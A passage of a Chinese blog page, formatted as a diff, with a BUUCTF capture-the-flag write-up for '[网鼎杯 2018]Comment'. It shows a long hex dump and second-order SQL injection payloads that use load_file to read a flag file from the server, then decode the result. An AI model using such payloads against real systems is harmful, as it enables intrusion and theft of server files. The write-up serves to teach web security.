FFFF00000000000600760065006E0064006F0072496C6F63626C6F6200000010000000CC00000108FFFFFFFFFFFF00000000000C00770072006900740065005F0064006F002E007000680070496C6F63626C6F62000000100000015200000108FFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000080B000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000002000000001000000400000000100000080000000010000010000000001000002000000000100000400000000000000000100001000000000010000200000000001000040000000000100008000000000010001000000000001000200000000000100040000000000010008000000000001001000000000000100200000000000010040000000000001008000000000000101000000000000010200000000000001040000000000000108000000000000011000000000000001200000000000000140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000100B000000450000040A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000104445344420000000100000000000000000000000000000000000000000000000200000020000000600000000000000001000000800000000100000100000000010000020000000000000000020000080000001800000000000000000100002000000000010000400000000001000080000000000100010000000000010002000000000001000400000000000100080000000000010010000000000001002000000000000100400000000000010080000000000001010000000000000102000000000000010400000000000001080000000000000110000000000000012000000000000001400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000<br></code></pre></td></tr></table></figure>
+
+<h3 id="16进制解码"><a href="#16进制解码" class="headerlink" title="16进制解码:"></a>16进制解码:</h3><p><strong>使用bp的ascii码16进制解码</strong></p>
+<p><img src="/images/2024-2-18/image-20240208224711172.png" srcset="/img/loading.gif" lazyload alt="image-20240208224711172"></p>
+<p>对这些项目文件进行观察，发现一个跟flag相关的文件:</p>
+<p><img src="/images/2024-2-18/image-20240208224815804.png" srcset="/img/loading.gif" lazyload alt="image-20240208224815804"></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag_8946e1ff1ee3e40f.php<br></code></pre></td></tr></table></figure>
+
+<p>该文件存在于&#x2F;tmp&#x2F;html&#x2F;目录下以及&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下，获取这两个目录中的任意一个文件就可以了</p>
+<h2 id="获取-tmp-html-目录下的flag-8946e1ff1ee3e40f-php："><a href="#获取-tmp-html-目录下的flag-8946e1ff1ee3e40f-php：" class="headerlink" title="获取&#x2F;tmp&#x2F;html&#x2F;目录下的flag_8946e1ff1ee3e40f.php："></a>获取&#x2F;tmp&#x2F;html&#x2F;目录下的flag_8946e1ff1ee3e40f.php：</h2><h3 id="payload1-3"><a href="#payload1-3" class="headerlink" title="payload1:"></a>payload1:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">title=south&amp;category=123&#x27;,content=((select(hex(load_file(&quot;/tmp/html/flag_8946e1ff1ee3e40f.php&quot;))))),/*&amp;content=666<br></code></pre></td></tr></table></figure>
+
+<h3 id="payload2-6"><a href="#payload2-6" class="headerlink" title="payload2:"></a>payload2:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">content=*/#&amp;bo_id=16<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/2024-2-18/image-20240208225236611.png" srcset="/img/loading.gif" lazyload alt="image-20240208225236611"></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">3C3F7068700A24666C6167203D2027666C61677B66396361316136622D396437382D313165382D393061332D6334623330316237623939627D273B0A3F3E0A<br></code></pre></td></tr></table></figure>
+
+<h3 id="16进制解码-1"><a href="#16进制解码-1" class="headerlink" title="16进制解码:"></a>16进制解码:</h3><p><img src="/images/2024-2-18/image-20240208225359567.png" srcset="/img/loading.gif" lazyload alt="image-20240208225359567"></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br>$flag = &#x27;flag&#123;f9ca1a6b-9d78-11e8-90a3-c4b301b7b99b&#125;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<p>flag&#x3D;flag{f9ca1a6b-9d78-11e8-90a3-c4b301b7b99b}</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BUUCTF_[网鼎杯 2018]Comment</div>
+      <div>http://example.com/2024/02/18/2024-02-18-[网鼎杯 2018]Comment/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>South</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年2月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/18/2024-02-18-%5BHarekazeCTF2019%5Dencode_and_encode/" title="BUUCTF_[HarekazeCTF2019]encode_and_encode">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">BUUCTF_[HarekazeCTF2019]encode_and_encode</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/02/18/2024-02-18-%5BNPUCTF2020%5Dezinclude/" title="BUUCTF_[NPUCTF2020]ezinclude">
+                        <span class="hidden-mobile">BUUCTF_[NPUCTF2020]ezinclude</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"ThR4XZRMA2SwXDt3MeF5vjCN-gzGzoHsz","appKey":"PmUqfFPhyiQDRYmHOO0IXjTV","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量
+        <span id="busuanzi_value_site_pv"></span>
+        次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数
+        <span id="busuanzi_value_site_uv"></span>
+        人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
